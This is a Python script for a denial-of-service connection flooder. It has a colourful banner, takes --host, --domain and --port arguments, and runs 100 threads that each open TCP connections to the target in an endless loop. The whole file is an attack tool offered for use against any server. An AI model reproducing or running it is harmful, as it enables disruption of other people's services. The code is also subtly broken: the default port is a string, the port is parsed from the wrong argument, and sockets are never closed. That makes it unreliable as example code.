import socket
import sys
import threading
import pystyle

class colors:
    red = '\033[91m'
    green = '\033[92m'
    blue = '\033[94m'
    yellow = '\033[93m'
    magenta = '\033[95m'
    cyan = '\033[96m'
    bold = '\033[1m'
    underline = '\033[4m'
    black='\033[30m'
    Backsilver='\033[100m'
    silver='\033[90m'
    Backwhite='\033[3m'
    Backgreen='\033[42m'
    Backyellow='\033[43m'
    BackBlue='\033[44m'
    Backpink='\033[45m'
    Backcyan='\033[46m'
    BackRed='\033[41m'
    green = '\033[32m' 
    red = '\033[31m' 
    blue = '\033[36m' 
    pink = '\033[35m' 
    yellow = '\033[93m' 
    darkblue = '\033[34m' 
    white = '\033[00m'
    bluo = '\033[34m'
    red_p = '\033[41m'
    green_p = '\033[42m'
    bluo_p = '\033[44m'
    pink_p = '\033[45m'
    blue_p = '\033[46m'
    white_p = '\033[47m'
    rd = '\033[91m'
    black='\033[30m'
    bold = '\033[1m'
    underline = '\033[4m'
    magenta = '\033[95m'
    
def run(h):
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        print("Packet send to " + host)



writer = pystyle.Write.Print

banner = """
    _____             _____      
    /    )  /    /    /    )     
---/----/--/____/----/----/---__-
  /    /       /    /    /   (_ `
_/____/_______/____/____/___(__)_

"""

writer(banner, pystyle.Colors.red_to_yellow, 0)
print()

host = ''
port = '80'
lis = sys.argv

def usageConsole():
    return f"""
{colors.white}{colors.BackRed}USAGE:{colors.white} python3 D4Ds.py --help
"""

def usageHelp():
    writer('{:<25} {:<}'.format('Commands', 'Usage'), pystyle.Colors.yellow_to_red, 0.08)
    print()
    writer('-----------------------------------', pystyle.Colors.purple_to_red, 0.08)
    print()
    writer('{:<25} {:<}'.format('--help', 'show this message'), pystyle.Colors.green_to_cyan, 0)
    print()
    writer('{:<25} {:<}'.format('--host', 'set host: --host 1.1.1.1'), pystyle.Colors.green_to_cyan, 0)
    print()
    writer('{:<25} {:<}'.format('--port', 'set port [optional]: --port 8080'), pystyle.Colors.green_to_cyan, 0)
    print()
    writer('{:<25} {:<}'.format('--domain', 'set domain to get host: --domain www.google.com'), pystyle.Colors.green_to_cyan, 0)
    print()
    print()

if "--host" in lis:
    
    if "--port" in lis:
        host = lis[lis.index('--host')+1]
        port = lis[lis.index('--host')+2]
        for i in range(100):
            t = threading.Thread(target=run, args=[i])
            t.start()
    
    else:
        host = lis[lis.index('--host')+1]
        for i in range(100):
            t = threading.Thread(target=run, args=[i])
            t.start()

if "--domain" in lis:
    
    if "--port" in lis:
        host = socket.gethostbyname(lis[lis.index('--domain')+1])
        port = lis[lis.index('--domain')+2]
        for i in range(100):
            t = threading.Thread(target=run, args=[i])
            t.start()
    
    else:
        host = socket.gethostbyname(lis[lis.index('--domain')+1])
        for i in range(100):
            t = threading.Thread(target=run, args=[i])
            t.start()

if "--help" in lis:
    usageHelp()

if len(lis) == 1:
    print(usageConsole())


